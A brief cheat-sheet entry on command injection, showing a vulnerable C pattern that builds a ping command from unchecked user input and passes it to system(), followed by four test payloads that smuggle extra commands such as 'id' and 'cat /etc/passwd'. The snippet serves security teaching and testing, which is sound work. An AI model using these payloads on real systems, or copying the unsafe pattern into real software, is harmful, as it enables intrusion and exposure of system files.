# Command Injection

```c
// Vulnerable pattern
char cmd[256];
sprintf(cmd, "ping %s", user_input);
system(cmd);

// Test payloads
; id
| cat /etc/passwd
`whoami`
$(id)
```